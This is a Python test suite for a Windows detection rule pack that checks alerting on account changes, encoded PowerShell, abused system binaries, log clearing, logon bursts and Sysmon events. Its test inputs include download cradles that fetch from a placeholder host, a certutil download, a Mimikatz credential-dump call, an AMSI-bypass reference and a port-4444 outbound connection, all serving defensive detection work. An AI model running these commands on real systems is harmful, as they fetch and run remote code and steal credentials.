# tests/test_rule_pack.py
import unittest
from datetime import datetime, timedelta
from pathlib import Path

from core.rule_engine.engine import run_rules
from core.rule_engine.loader import load_rules
from ingestion.normalizer import normalize_windows_xml
from tests import helpers_rules
from tests.helpers_rules import T0

PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
SYS32 = "C:\\Windows\\System32\\"
SYSMON = "Microsoft-Windows-Sysmon/Operational"
# Sysmon's Image and ParentImage are full paths, like a real 4688's.
WORD = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
CHROME = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"

CASES = [
    # (rule_id, event kwargs that MUST fire, event kwargs that must NOT)
    ("win-account-created",
     dict(event_id=4720, target_user="mallory", action="ACCOUNT_CREATE"),
     dict(event_id=4722, target_user="mallory", action="ACCOUNT_ENABLE")),
    ("win-security-group-add",
     dict(event_id=4732, target_user="mallory", action="GROUP_ADD_LOCAL"),
     dict(event_id=4729, target_user="mallory", action="OTHER")),
    ("win-encoded-powershell",
     dict(event_id=4688, process="powershell.exe", action="PROCESS_CREATE",
          command_line="powershell.exe -EncodedCommand SQBFAFgA"),
     dict(event_id=4688, process="powershell.exe", action="PROCESS_CREATE",
          command_line="powershell.exe -File C:\\scripts\\backup.ps1")),
    ("win-lolbin-execution",
     dict(event_id=4688, process="certutil.exe", action="PROCESS_CREATE",
          command_line="certutil -urlcache -split -f http://x/y.exe"),
     dict(event_id=4688, process="notepad.exe", action="PROCESS_CREATE",
          command_line="notepad.exe readme.txt")),
    ("win-suspicious-scriptblock",
     dict(event_id=4104, action="SCRIPTBLOCK",
          command_line="IEX (New-Object Net.WebClient).DownloadString('http://x')"),
     dict(event_id=4104, action="SCRIPTBLOCK", command_line="Get-ChildItem C:\\")),
    ("win-service-installed",
     dict(event_id=7045, action="SERVICE_INSTALL", service_name="EvilSvc",
          channel="System"),
     dict(event_id=7040, action="OTHER", service_name="EvilSvc",
          channel="System")),
    ("win-scheduled-task-created",
     dict(event_id=4698, action="TASK_CREATE", object_name="\\Evil"),
     dict(event_id=4699, action="OTHER", object_name="\\Evil")),
    ("win-audit-log-cleared",
     dict(event_id=1102, action="LOG_CLEARED", user="mallory"),
     dict(event_id=1100, action="OTHER", user="mallory")),
    ("win-off-hours-logon",
     dict(event_id=4624, action="LOGIN_OK", logon_type=2, user="alice",
          timestamp=datetime(2026, 10, 3, 3, 14)),
     dict(event_id=4624, action="LOGIN_OK", logon_type=2, user="alice",
          timestamp=datetime(2026, 10, 3, 10, 14))),
    ("win-admin-share-access",
     dict(event_id=5140, action="SHARE_ACCESS", object_name="\\\\*\\ADMIN$",
          source_ip="10.0.0.9"),
     dict(event_id=5140, action="SHARE_ACCESS", object_name="\\\\*\\Public",
          source_ip="10.0.0.9")),
    ("win-password-reset-by-other",
     dict(event_id=4724, action="PASSWORD_RESET", user="mallory",
          target_user="alice"),
     # The brief's negative was user == target_user, which the matcher cannot
     # express (field vs literal only), so the rule fires on it by design; see
     # test_password_reset_is_documented_as_including_self_service. 4723 is
     # the neighbouring event, a user changing their own password.
     dict(event_id=4723, action="OTHER", user="alice", target_user="alice")),
    ("win-default-account-logon",
     dict(event_id=4624, action="LOGIN_OK", target_user="Guest"),
     dict(event_id=4624, action="LOGIN_OK", target_user="alice")),
    ("sysmon-office-spawn",
     dict(event_id=1, channel=SYSMON, action="PROCESS_CREATE", parent_process=WORD,
          process=SYS32 + "cmd.exe", command_line="cmd /c whoami"),
     dict(event_id=1, channel=SYSMON, action="PROCESS_CREATE",
          parent_process="C:\\Windows\\explorer.exe", process=SYS32 + "cmd.exe",
          command_line="cmd /c whoami")),
    ("sysmon-suspicious-outbound",
     dict(event_id=3, channel=SYSMON, action="NETWORK_CONNECT", process=PS,
          dest_ip="203.0.113.9", dest_port=4444),
     dict(event_id=3, channel=SYSMON, action="NETWORK_CONNECT", process=CHROME,
          dest_ip="203.0.113.9", dest_port=443)),
]


class RulePackCase(unittest.TestCase):
    """Loads the shipped pack once per class; every class below shares it."""

    @classmethod
    def setUpClass(cls):
        cls.rules, errors = load_rules(Path("rules/windows"))
        assert not errors, errors
        cls.by_id = {r.id: r for r in cls.rules}


class TestRulePackBehaviour(RulePackCase):

    def test_each_rule_checks_action_itself(self):
        # Defence in depth: the normalizer leaves a forged event's other
        # fields empty today, so most rules would stay quiet without an
        # `action` line anyway. A hand-built event with every other field
        # right but action OTHER proves each rule carries the guard itself,
        # in case a future mapping fills those fields on any channel.
        for rule_id, positive, _ in CASES:
            with self.subTest(rule=rule_id):
                alerts, _ = run_rules(
                    [helpers_rules.event(**dict(positive, action="OTHER"))],
                    [self.by_id[rule_id]])
                self.assertEqual([], alerts, "fired without a matching action")

    def test_every_case_names_a_rule_that_exists(self):
        missing = [rule_id for rule_id, _, _ in CASES
                   if rule_id not in self.by_id]
        self.assertEqual([], missing)

    def test_each_rule_fires_on_its_positive_case(self):
        for rule_id, positive, _ in CASES:
            with self.subTest(rule=rule_id):
                alerts, failures = run_rules(
                    [helpers_rules.event(**positive)], [self.by_id[rule_id]])
                self.assertEqual([], failures)
                self.assertEqual(1, len(alerts), "did not fire")

    def test_each_rule_stays_quiet_on_its_negative_case(self):
        for rule_id, _, negative in CASES:
            with self.subTest(rule=rule_id):
                alerts, _ = run_rules(
                    [helpers_rules.event(**negative)], [self.by_id[rule_id]])
                self.assertEqual([], alerts, "fired when it should not")

    def test_no_rule_fires_on_a_benign_event(self):
        # The false-positive floor: an ordinary interactive logon at 10:00
        # must trip nothing in the whole pack.
        benign = helpers_rules.event(
            event_id=4624, action="LOGIN_OK", logon_type=2, user="alice",
            target_user="alice", process="-", command_line="-",
            timestamp=datetime(2026, 10, 3, 10, 0))
        alerts, failures = run_rules([benign], self.rules)
        self.assertEqual([], failures)
        self.assertEqual([], [a.rule_id for a in alerts])

    def test_every_rule_has_a_mitre_technique_and_tactic(self):
        for rule in self.rules:
            with self.subTest(rule=rule.id):
                self.assertRegex(rule.technique, r"^T\d{4}(\.\d{3})?$")
                self.assertRegex(rule.tactic, r"^TA\d{4}$")

    def test_every_rule_has_a_description_and_a_false_positive_note(self):
        # A rule with no false-positive note has not been thought through.
        for rule in self.rules:
            with self.subTest(rule=rule.id):
                self.assertTrue(rule.description.strip())
                self.assertTrue(rule.falsepositives)

    def test_rule_ids_match_their_filenames(self):
        for rule in self.rules:
            with self.subTest(rule=rule.id):
                self.assertEqual(rule.id, Path(rule.source_file).stem)


# ----------------------------------------------------------------------
# Beyond the table above. The table builds events by hand, which cannot
# prove a rule matches what the normalizer really produces, and its inputs
# cannot tell a filter, a boundary or a list entry from its absence.
# ----------------------------------------------------------------------

def _xml(event_id, channel, **data):
    """A Windows Event record shaped like `wevtutil qe`, normalised for real."""
    body = "".join("<Data Name='{}'>{}</Data>".format(k, v) for k, v in data.items())
    return normalize_windows_xml(
        "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
        "<System><Provider Name='p'/><EventID>{}</EventID>"
        "<TimeCreated SystemTime='2026-10-03T12:00:00.0000000Z'/>"
        "<EventRecordID>1</EventRecordID><Channel>{}</Channel>"
        "<Computer>PC-01</Computer></System><EventData>{}</EventData></Event>"
        .format(event_id, channel, body))


# Real-shaped records, one per rule: full paths, the real field names.
REAL = [
    ("win-account-created", _xml(4720, "Security", SubjectUserName="admin",
                                 TargetUserName="mallory")),
    ("win-security-group-add", _xml(4732, "Security", SubjectUserName="admin",
                                      MemberName="CN=mallory", TargetUserName="Administrators")),
    ("win-security-group-add", _xml(4728, "Security", SubjectUserName="admin",
                                      MemberName="CN=mallory", TargetUserName="Domain Admins")),
    ("win-encoded-powershell", _xml(4688, "Security", NewProcessName=PS,
                                    CommandLine="powershell -nop -enc SQBFAFgA")),
    ("win-lolbin-execution", _xml(4688, "Security", NewProcessName=SYS32 + "certutil.exe",
                                  CommandLine="certutil -urlcache -f http://x/y y.exe")),
    ("win-suspicious-scriptblock", _xml(4104, "Microsoft-Windows-PowerShell/Operational",
                                        ScriptBlockText="iex (iwr http://x)")),
    ("win-service-installed", _xml(7045, "System", ServiceName="EvilSvc",
                                   ImagePath="C:\\x\\e.exe", AccountName="LocalSystem")),
    ("win-scheduled-task-created", _xml(4698, "Security", SubjectUserName="admin",
                                        TaskName="\\Evil")),
    ("win-audit-log-cleared", _xml(1102, "Security", SubjectUserName="admin")),
    ("win-admin-share-access", _xml(5140, "Security", SubjectUserName="admin",
                                    IpAddress="10.0.0.9", ShareName="\\\\*\\C$")),
    ("win-password-reset-by-other", _xml(4724, "Security", SubjectUserName="admin",
                                         TargetUserName="alice")),
    ("win-default-account-logon", _xml(4624, "Security", TargetUserName="Guest",
                                       LogonType="3", IpAddress="10.0.0.9")),
    ("sysmon-office-spawn", _xml(1, SYSMON, Image=SYS32 + "cmd.exe", ParentImage=WORD,
                                 CommandLine="cmd /c whoami", User="PC-01\\alice")),
    ("sysmon-suspicious-outbound", _xml(3, SYSMON, Image=PS, DestinationIp="203.0.113.9",
                                        DestinationPort="4444", SourceIp="10.0.0.5")),
]


class TestRulesMatchWhatTheNormalizerProduces(RulePackCase):
    def fired(self, event):
        alerts, failures = run_rules([event], self.rules)
        self.assertEqual([], failures)
        return {a.rule_id for a in alerts}

    def test_every_rule_fires_on_a_normalised_real_shaped_record(self):
        for rule_id, event in REAL:
            with self.subTest(rule=rule_id, event_id=event.event_id):
                self.assertIn(rule_id, self.fired(event))

    def test_off_hours_logon_fires_on_a_normalised_record(self):
        # TargetUserName is the logged-on user; the hour is local time.
        event = _xml(4624, "Security", TargetUserName="alice", LogonType="2")
        event.timestamp = datetime(2026, 10, 3, 3, 0)
        self.assertIn("win-off-hours-logon", self.fired(event))

    def test_a_forged_event_id_on_an_unprivileged_channel_fires_nothing(self):
        # Anyone can write to Application; the normalizer leaves such a record
        # as OTHER, and a rule that keyed on event_id alone would alert on it.
        # Every rule whose only conditions are event_id and action needs a row
        # here: for those, `action` is the sole guard, and deleting it from
        # the rule must make this test fail.
        for event_id, data in ((1102, dict(SubjectUserName="x")),
                               (4720, dict(TargetUserName="x")),
                               (4698, dict(SubjectUserName="x", TaskName=r"\Evil")),
                               (4724, dict(SubjectUserName="x", TargetUserName="y")),
                               (4728, dict(SubjectUserName="x", MemberName="y")),
                               (4732, dict(SubjectUserName="x", MemberName="y")),
                               (4688, dict(NewProcessName=PS, CommandLine="powershell -enc AAA")),
                               (7045, dict(ServiceName="x")),
                               (4624, dict(TargetUserName="Guest")),
                               (1, dict(Image=SYS32 + "cmd.exe", ParentImage=WORD)),
                               (3, dict(Image=PS, DestinationPort="4444"))):
            with self.subTest(event_id=event_id):
                self.assertEqual(set(), self.fired(_xml(event_id, "Application", **data)))

    def test_a_service_installed_event_on_a_non_system_channel_fires_nothing(self):
        self.assertEqual(set(), self.fired(_xml(7045, "Security", ServiceName="x")))


class TestRuleDetails(RulePackCase):
    def fires(self, rule_id, **kwargs):
        alerts, failures = run_rules([helpers_rules.event(**kwargs)], [self.by_id[rule_id]])
        self.assertEqual([], failures)
        return bool(alerts)

    def test_both_group_add_event_ids_fire(self):
        self.assertTrue(self.fires("win-security-group-add", event_id=4728,
                                   action="GROUP_ADD_GLOBAL"))
        self.assertTrue(self.fires("win-security-group-add", event_id=4732,
                                   action="GROUP_ADD_LOCAL"))

    def test_encoded_powershell_flag_spellings(self):
        # Every prefix PowerShell accepts for -EncodedCommand, plus -ec.
        prefixes = ["-" + "encodedcommand"[:n] for n in range(1, 15)]
        cases = [(flag, True) for flag in prefixes + ["-ec", "/enc", "-EncodedCommand"]]
        # -Encoding is a routine parameter, not an encoded command.
        cases += [("-Encoding", False), ("-encoding", False), ("-ExecutionPolicy", False),
                  ("-NoProfile", False), ("-EncodedArgumentsX", False), ("-ex", False)]
        for flag, expect in cases:
            with self.subTest(flag=flag):
                self.assertEqual(expect, self.fires(
                    "win-encoded-powershell", event_id=4688, action="PROCESS_CREATE",
                    process=PS, command_line="powershell {} QQBB".format(flag)))

    def test_encoded_powershell_ignores_out_file_encoding(self):
        # The probe that produced a HIGH alert on an ordinary installer line.
        self.assertFalse(self.fires(
            "win-encoded-powershell", event_id=4688, action="PROCESS_CREATE", process=PS,
            command_line='powershell -Command "x | Out-File y -Encoding utf8"'))

    def test_encoded_powershell_needs_powershell_not_just_the_flag(self):
        self.assertFalse(self.fires(
            "win-encoded-powershell", event_id=4688, action="PROCESS_CREATE",
            process=SYS32 + "certutil.exe", command_line="certutil -enc in out"))

    def test_encoded_powershell_covers_pwsh_and_full_paths(self):
        for process in ("C:\\Program Files\\PowerShell\\7\\pwsh.exe", PS,
                        SYS32 + "WindowsPowerShell\\v1.0\\powershell_ise.exe"):
            with self.subTest(process=process):
                self.assertTrue(self.fires(
                    "win-encoded-powershell", event_id=4688, action="PROCESS_CREATE",
                    process=process, command_line="x -enc QQBB"))

    def test_lolbin_binary_set(self):
        for name in ("certutil", "mshta", "regsvr32", "bitsadmin", "wmic", "cscript",
                     "wscript", "msbuild", "installutil", "cmstp", "odbcconf",
                     "regasm", "regsvcs", "forfiles", "rundll32"):
            with self.subTest(binary=name):
                self.assertTrue(self.fires(
                    "win-lolbin-execution", event_id=4688, action="PROCESS_CREATE",
                    process=SYS32 + name + ".exe", command_line=name + " arg"))

    def test_lolbin_filter_drops_rundll32_with_no_arguments(self):
        for command_line in ('rundll32.exe', '"C:\\Windows\\System32\\rundll32.exe"',
                             'C:\\Windows\\System32\\rundll32.exe '):
            with self.subTest(command_line=command_line):
                self.assertFalse(self.fires(
                    "win-lolbin-execution", event_id=4688, action="PROCESS_CREATE",
                    process=SYS32 + "rundll32.exe", command_line=command_line))

    def test_lolbin_filter_keeps_rundll32_with_arguments(self):
        for command_line in ('rundll32.exe evil.dll,Run',
                             # trailing "rundll32" must not read as an empty command line
                             'rundll32.exe evil.dll,Run rundll32',
                             'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"'):
            with self.subTest(command_line=command_line):
                self.assertTrue(self.fires(
                    "win-lolbin-execution", event_id=4688, action="PROCESS_CREATE",
                    process=SYS32 + "rundll32.exe", command_line=command_line))

    def test_lolbin_filter_does_not_excuse_a_masquerading_system32(self):
        for process in (r"C:\evil\system32\rundll32.exe",
                        r"C:\Users\bob\Windows\System32\rundll32.exe",
                        r"C:\Windows.old\System32\rundll32.exe",
                        r"C:\Windows\System32\evil\rundll32.exe"):
            with self.subTest(process=process):
                self.assertTrue(self.fires(
                    "win-lolbin-execution", event_id=4688, action="PROCESS_CREATE",
                    process=process, command_line="rundll32.exe"))

    def test_lolbin_filter_path_is_anchored_at_the_start(self):
        # The path must BEGIN with the drive and \windows: a drive-looking
        # string deeper in the path (an alternate data stream name, say) does
        # not make a copy a real System32 rundll32.
        self.assertTrue(self.fires(
            "win-lolbin-execution", event_id=4688, action="PROCESS_CREATE",
            process=r"C:\evil\x:c:\windows\system32\rundll32.exe",
            command_line="rundll32.exe"))

    def test_lolbin_filter_accepts_the_real_paths_on_the_c_drive(self):
        for process in (r"C:\Windows\SysWOW64\rundll32.exe",
                        r"c:\WINDOWS\system32\RUNDLL32.EXE"):
            with self.subTest(process=process):
                self.assertFalse(self.fires(
                    "win-lolbin-execution", event_id=4688, action="PROCESS_CREATE",
                    process=process, command_line="rundll32.exe"))

    def test_lolbin_filter_does_not_excuse_a_windows_tree_on_another_drive(self):
        # %SystemRoot% is not a matchable field, so the filter assumes C:. A
        # secondary volume is writable by a standard user, who can create
        # D:\Windows\System32 and put a copy there; a Windows really installed
        # on D: costs extra alerts, never a missed one.
        for process in (r"D:\Windows\System32\rundll32.exe",
                        r"D:\WINDOWS\system32\RUNDLL32.EXE",
                        r"E:\Windows\SysWOW64\rundll32.exe"):
            with self.subTest(process=process):
                self.assertTrue(self.fires(
                    "win-lolbin-execution", event_id=4688, action="PROCESS_CREATE",
                    process=process, command_line="rundll32.exe"))

    def test_lolbin_filter_is_for_rundll32_only(self):
        # An empty-argument command line on any other binary is not excused,
        # and neither is a rundll32 outside Windows\System32, including a
        # copy in a directory an attacker named system32.
        self.assertTrue(self.fires(
            "win-lolbin-execution", event_id=4688, action="PROCESS_CREATE",
            process=SYS32 + "mshta.exe", command_line="rundll32.exe"))
        self.assertTrue(self.fires(
            "win-lolbin-execution", event_id=4688, action="PROCESS_CREATE",
            process="C:\\Users\\bob\\rundll32.exe", command_line="rundll32.exe"))

    def test_scriptblock_terms(self):
        # One term per row, none sharing a line with another, so deleting any
        # entry from the rule is caught.
        for text, expect in (("Get-Content x | iex", True),
                             ("Invoke-Expression $x", True),
                             ("[Convert]::FromBase64String($s)", True),
                             ("$w.DownloadFile($u,$p)", True),
                             ("$w.DownloadString($u)", True),
                             ("New-Object Net.WebClient", True),
                             ("Invoke-Mimikatz -DumpCreds", True),
                             ("$f = VirtualAlloc(0, $n)", True),
                             ("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
                              True),
                             ("Get-Index flex iexplore", False),
                             ("Write-Host hello", False)):
            with self.subTest(text=text):
                self.assertEqual(expect, self.fires(
                    "win-suspicious-scriptblock", event_id=4104, action="SCRIPTBLOCK",
                    command_line=text))

    def test_off_hours_boundaries(self):
        # Business hours are 07:00 through 19:59; the edges are where an
        # off-by-one in the range would hide.
        for hour, expect in ((0, True), (6, True), (7, False), (12, False),
                             (19, False), (20, True), (23, True)):
            with self.subTest(hour=hour):
                self.assertEqual(expect, self.fires(
                    "win-off-hours-logon", event_id=4624, action="LOGIN_OK", logon_type=2,
                    user="alice", timestamp=datetime(2026, 10, 3, hour, 59)))

    def test_off_hours_only_counts_interactive_logons(self):
        self.assertFalse(self.fires(
            "win-off-hours-logon", event_id=4624, action="LOGIN_OK", logon_type=3,
            user="alice", timestamp=datetime(2026, 10, 3, 3, 0)))

    def test_admin_shares(self):
        for share, expect in (("\\\\*\\ADMIN$", True), ("\\\\*\\C$", True),
                              ("\\\\*\\D$", True), ("\\\\*\\admin$", True),
                              ("\\\\*\\IPC$", False), ("\\\\*\\Public", False),
                              ("\\\\*\\Cash", False)):
            with self.subTest(share=share):
                self.assertEqual(expect, self.fires(
                    "win-admin-share-access", event_id=5140, action="SHARE_ACCESS",
                    object_name=share))

    def test_default_accounts(self):
        for name, expect in (("Guest", True), ("guest", True), ("DefaultAccount", True),
                             ("Administrator", False), ("alice", False)):
            with self.subTest(name=name):
                self.assertEqual(expect, self.fires(
                    "win-default-account-logon", event_id=4624, action="LOGIN_OK",
                    target_user=name))

    def test_a_failed_guest_logon_is_not_a_default_account_logon(self):
        self.assertFalse(self.fires("win-default-account-logon", event_id=4625,
                                    action="LOGIN_FAIL", target_user="Guest"))

    def test_password_reset_is_documented_as_including_self_service(self):
        # The matcher cannot compare user to target_user. The rule must say so,
        # because an analyst reading MEDIUM would otherwise assume it excludes
        # a user resetting their own password.
        rule = self.by_id["win-password-reset-by-other"]
        self.assertTrue(self.fires("win-password-reset-by-other", event_id=4724,
                                   action="PASSWORD_RESET", user="alice",
                                   target_user="alice"))
        self.assertIn("self-service", rule.description.lower())
        self.assertIn("self-service", " ".join(rule.falsepositives).lower())

    def test_severities_and_techniques_are_the_ones_the_pack_agreed(self):
        expected = {
            "win-account-created": ("MEDIUM", "T1136.001", "TA0003"),
            "win-security-group-add": ("MEDIUM", "T1098", "TA0004"),
            "win-encoded-powershell": ("HIGH", "T1027.010", "TA0005"),
            "win-lolbin-execution": ("HIGH", "T1218", "TA0005"),
            "win-suspicious-scriptblock": ("HIGH", "T1059.001", "TA0002"),
            "win-service-installed": ("MEDIUM", "T1543.003", "TA0003"),
            "win-scheduled-task-created": ("MEDIUM", "T1053.005", "TA0003"),
            "win-audit-log-cleared": ("CRITICAL", "T1070.001", "TA0005"),
            "win-off-hours-logon": ("LOW", "T1078", "TA0005"),
            "win-admin-share-access": ("MEDIUM", "T1021.002", "TA0008"),
            "win-password-reset-by-other": ("MEDIUM", "T1098", "TA0004"),
            "win-default-account-logon": ("HIGH", "T1078.001", "TA0005"),
        }
        got = {r.id: (r.severity, r.technique, r.tactic) for r in self.rules}
        for rule_id, want in expected.items():
            with self.subTest(rule=rule_id):
                self.assertEqual(want, got.get(rule_id))

    def test_tooling_wrapper_false_positive_is_documented_not_filtered(self):
        # Claude Code's PowerShell wrapper trips both rules on this host. The
        # note is the decision record: an operator reads it and chooses.
        for rule_id in ("win-encoded-powershell", "win-suspicious-scriptblock"):
            with self.subTest(rule=rule_id):
                self.assertIn("coding agents",
                              " ".join(self.by_id[rule_id].falsepositives).lower())

    def test_the_off_hours_note_says_business_hours_are_local_policy(self):
        rule = self.by_id["win-off-hours-logon"]
        self.assertIn("business hours", " ".join(rule.falsepositives).lower())


# ----------------------------------------------------------------------
# Part 2 of the pack: four threshold rules and two Sysmon rules.
# ----------------------------------------------------------------------

BURST_CASES = [
    # (rule_id, count that must fire, event kwargs template)
    ("win-failed-logon-burst", 5,
     dict(event_id=4625, action="LOGIN_FAIL", source_ip="1.2.3.4",
          target_user="alice")),
    ("win-rdp-logon-failure-burst", 5,
     dict(event_id=4625, action="LOGIN_FAIL", logon_type=10,
          source_ip="1.2.3.4", target_user="alice")),
    ("win-account-lockout-storm", 3,
     dict(event_id=4740, action="ACCOUNT_LOCKOUT", target_user="alice",
          host="PC-01")),
    ("win-ntlm-failure-burst", 5,
     dict(event_id=4776, action="NTLM_VALIDATE", target_user="alice",
          status="0xc000006a")),
]

# Written out here, not read back from the rule: a test that scales by
# rule.timeframe passes whatever timeframe the rule declares.
TIMEFRAMES = {
    "win-failed-logon-burst": timedelta(minutes=5),
    "win-rdp-logon-failure-burst": timedelta(minutes=5),
    "win-account-lockout-storm": timedelta(minutes=10),
    "win-ntlm-failure-burst": timedelta(minutes=5),
}

# rule -> {grouped field: two values that must not pool into one window}.
SPLITS = {
    "win-failed-logon-burst": {"source_ip": ("1.2.3.4", "5.6.7.8"),
                               "target_user": ("alice", "bob")},
    "win-rdp-logon-failure-burst": {"source_ip": ("1.2.3.4", "5.6.7.8")},
    "win-account-lockout-storm": {"host": ("PC-01", "PC-02")},
    "win-ntlm-failure-burst": {"target_user": ("alice", "bob")},
}

# The same bursts as the normalizer really produces them.
REAL_BURSTS = [
    ("win-failed-logon-burst", 5, 4625,
     dict(TargetUserName="alice", SubjectUserName="-", IpAddress="1.2.3.4",
          LogonType="3", Status="0xc000006d", WorkstationName="WS-9")),
    ("win-rdp-logon-failure-burst", 5, 4625,
     dict(TargetUserName="alice", SubjectUserName="-", IpAddress="1.2.3.4",
          LogonType="10", Status="0xc000006d", WorkstationName="WS-9")),
    ("win-account-lockout-storm", 3, 4740,
     dict(TargetUserName="alice", TargetDomainName="WS-9")),
    ("win-ntlm-failure-burst", 5, 4776,
     dict(TargetUserName="alice", Workstation="WS-9", Status="0xC000006A")),
]


def _real_burst(event_id, channel, count, data):
    events = []
    for i in range(count):
        event = _xml(event_id, channel, **data)
        event.record_id, event.timestamp = i, T0 + timedelta(seconds=i * 10)
        events.append(event)
    return events


class TestThresholdRules(RulePackCase):
    def burst(self, count, template, span=None):
        """`count` events, 10s apart, or spread evenly across `span`."""
        step = (lambda i: timedelta(seconds=i * 10)) if span is None else (
            lambda i: span * i // (count - 1))
        return [helpers_rules.event(record_id=i, timestamp=T0 + step(i), **template)
                for i in range(count)]

    def test_a_full_burst_fires_exactly_once(self):
        for rule_id, count, template in BURST_CASES:
            with self.subTest(rule=rule_id):
                rule = self.by_id[rule_id]
                alerts, failures = run_rules(self.burst(count, template), [rule])
                self.assertEqual([], failures)
                self.assertEqual(1, len(alerts))
                self.assertEqual(count, len(alerts[0].event_hashes))

    def test_one_short_of_the_threshold_stays_quiet(self):
        for rule_id, count, template in BURST_CASES:
            with self.subTest(rule=rule_id):
                alerts, _ = run_rules(self.burst(count - 1, template),
                                      [self.by_id[rule_id]])
                self.assertEqual([], alerts)

    def test_a_burst_spanning_exactly_the_timeframe_fires(self):
        for rule_id, count, template in BURST_CASES:
            with self.subTest(rule=rule_id):
                alerts, _ = run_rules(
                    self.burst(count, template, TIMEFRAMES[rule_id]),
                    [self.by_id[rule_id]])
                self.assertEqual(1, len(alerts))

    def test_a_burst_one_second_over_the_timeframe_stays_quiet(self):
        for rule_id, count, template in BURST_CASES:
            with self.subTest(rule=rule_id):
                span = TIMEFRAMES[rule_id] + timedelta(seconds=1)
                alerts, _ = run_rules(self.burst(count, template, span),
                                      [self.by_id[rule_id]])
                self.assertEqual([], alerts)

    def test_a_burst_with_the_wrong_action_stays_quiet(self):
        # Same guard as the per-event rules: the burst has every other field
        # right and action OTHER, so only the rule's own action line stops it.
        for rule_id, count, template in BURST_CASES:
            with self.subTest(rule=rule_id):
                alerts, _ = run_rules(
                    self.burst(count, dict(template, action="OTHER")),
                    [self.by_id[rule_id]])
                self.assertEqual([], alerts, "fired without a matching action")

    def test_a_burst_with_the_right_action_but_another_event_id_stays_quiet(self):
        # The legacy ssh and apache parsers also emit LOGIN_FAIL, with event_id
        # 0, so for failed-logon-burst the event_id line is what keeps a
        # password-guessing burst against sshd out of a Windows rule. For the
        # other three no normalizer output tells the two apart (their action
        # or status comes only from one EventID), so there this pins the rule
        # to the EventID its description names.
        for rule_id, count, template in BURST_CASES:
            with self.subTest(rule=rule_id):
                alerts, _ = run_rules(
                    self.burst(count, dict(template, event_id=0, source_type="ssh",
                                           channel="ssh")),
                    [self.by_id[rule_id]])
                self.assertEqual([], alerts, "fired on another EventID")

    def test_each_grouped_field_keeps_its_windows_apart(self):
        for rule_id, count, template in BURST_CASES:
            for field, values in SPLITS[rule_id].items():
                with self.subTest(rule=rule_id, field=field):
                    events = [helpers_rules.event(
                        record_id=i, timestamp=T0 + timedelta(seconds=i),
                        **dict(template, **{field: values[i % 2]}))
                        for i in range(count)]
                    alerts, _ = run_rules(events, [self.by_id[rule_id]])
                    self.assertEqual([], alerts, "pooled across " + field)

    def test_a_successful_ntlm_validation_does_not_count(self):
        # Rule 16 exists only because Task 1 promoted `status`: success and
        # failure share action NTLM_VALIDATE, so status is the discriminator.
        template = dict(event_id=4776, action="NTLM_VALIDATE",
                        target_user="alice", status="0x0")
        alerts, _ = run_rules(self.burst(5, template),
                              [self.by_id["win-ntlm-failure-burst"]])
        self.assertEqual([], alerts)

    def test_a_4776_with_no_recorded_status_does_not_count(self):
        # `status` defaults to "-": an event that says nothing about the
        # outcome is not evidence of a failure.
        template = dict(event_id=4776, action="NTLM_VALIDATE", target_user="alice")
        self.assertEqual("-", helpers_rules.event(**template).status)
        alerts, _ = run_rules(self.burst(5, template),
                              [self.by_id["win-ntlm-failure-burst"]])
        self.assertEqual([], alerts)

    def test_any_ntlm_failure_status_counts_and_successes_between_do_not(self):
        rule = self.by_id["win-ntlm-failure-burst"]
        for status in ("0xc000006a", "0xC000006A", "0xc0000064", "0xc0000234"):
            with self.subTest(status=status):
                template = dict(BURST_CASES[3][2], status=status)
                alerts, _ = run_rules(self.burst(5, template), [rule])
                self.assertEqual(1, len(alerts))
        # Four failures with four successes mixed in is four, not eight.
        events = [helpers_rules.event(
            record_id=i, timestamp=T0 + timedelta(seconds=i),
            **dict(BURST_CASES[3][2], status="0xc000006a" if i % 2 else "0x0"))
            for i in range(8)]
        alerts, _ = run_rules(events, [rule])
        self.assertEqual([], alerts)

    def test_rdp_burst_ignores_a_non_rdp_logon_type(self):
        template = dict(event_id=4625, action="LOGIN_FAIL", logon_type=3,
                        source_ip="1.2.3.4", target_user="alice")
        alerts, _ = run_rules(self.burst(5, template),
                              [self.by_id["win-rdp-logon-failure-burst"]])
        self.assertEqual([], alerts)

    def test_two_source_ips_do_not_pool_into_one_burst(self):
        rule = self.by_id["win-failed-logon-burst"]
        events = []
        for ip in ("1.2.3.4", "5.6.7.8"):
            events += [helpers_rules.event(
                event_id=4625, action="LOGIN_FAIL", source_ip=ip,
                target_user="alice", record_id=len(events) + i,
                timestamp=T0 + timedelta(seconds=i)) for i in range(3)]
        alerts, _ = run_rules(events, [rule])
        self.assertEqual([], alerts, "3 + 3 from two IPs is not a burst of 5")

    def test_the_failed_logon_filter_drops_the_session_helper_accounts(self):
        # One name per alternative in the rule's filter regex.
        rule = self.by_id["win-failed-logon-burst"]
        for name in ("DWM-1", "dwm-12", "UMFD-0", "umfd-3", "HealthMailbox0a1b2c3",
                     "healthmailboxabc1234"):
            with self.subTest(name=name):
                template = dict(BURST_CASES[0][2], target_user=name)
                alerts, _ = run_rules(self.burst(5, template), [rule])
                self.assertEqual([], alerts)

    def test_the_failed_logon_filter_is_anchored_to_the_whole_name(self):
        # target_user is the name that was tried, so the filter must not
        # excuse a real account merely because its name starts or ends alike.
        rule = self.by_id["win-failed-logon-burst"]
        for name in ("DWM-admin", "UMFD-bob", "HealthMailbox-evil", "HealthMailbox",
                     "xDWM-1", "DWM-1x", "UMFD-", "Administrator",
                     # `$` would excuse a trailing newline, `\Z` does not.
                     "UMFD-1\n", "DWM-1\n", "HealthMailbox0a1b2c3\n"):
            with self.subTest(name=name):
                template = dict(BURST_CASES[0][2], target_user=name)
                alerts, _ = run_rules(self.burst(5, template), [rule])
                self.assertEqual(1, len(alerts))

    def test_bursts_from_an_unrecorded_source_pool_and_the_rules_say_so(self):
        # Windows writes IpAddress "-" on NTLM/Kerberos pass-through failures,
        # so every such failure shares one source_ip. The rdp rule groups on
        # source_ip alone: five different users from "-" are one burst.
        rule = self.by_id["win-rdp-logon-failure-burst"]
        events = [helpers_rules.event(
            record_id=i, timestamp=T0 + timedelta(seconds=i), event_id=4625,
            action="LOGIN_FAIL", logon_type=10, source_ip="-",
            target_user="user%d" % i) for i in range(5)]
        alerts, _ = run_rules(events, [rule])
        self.assertEqual(1, len(alerts))
